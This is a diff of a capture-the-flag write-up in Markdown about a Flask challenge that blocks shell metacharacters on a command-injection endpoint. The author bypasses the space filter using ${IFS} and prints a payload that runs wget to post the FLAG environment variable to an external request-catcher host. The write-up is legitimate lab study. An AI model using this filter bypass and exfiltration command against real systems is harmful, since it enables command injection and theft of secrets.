@@ -3,9 +3,11 @@
 
 - So continuing on last challenge but with more pepper! we have some blocked characters `blocked = \[";", "&", "``", "|", " ", "'", '"', ">", "<"\]`
 - ![bdbc6d2e7d287e278e9ecadb0bda6e51.png](bdbc6d2e7d287e278e9ecadb0bda6e51.png)
+
 <details>
-    <summary>Reveal Code</summary>
+<summary>Reveal Code</summary>
 ```python
+
 from flask import Flask, render_template, request, redirect
 import os
 import re
@@ -53,7 +55,9 @@ if \_\_name\_\_ == "\_\_main\_\_":
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=False, host="0.0.0.0", port=port)
 ```
+
 </details>
+
 - So now we have to bypass this! let's go!
 - our last payload from cig 0 works all good except we can't use spaces! haha guess what I saw a John Hammod video some time ago about this issue! I introduce to you the `${IFS}` environment var! which is basically a whitespace! so now we just need to replace all the spaces in our payload with that
 - `/backdoor?cmd=wget${IFS}--post-data=$(echo${IFS}$FLAG)${IFS}ayham.requestcatcher.com/` here we go!
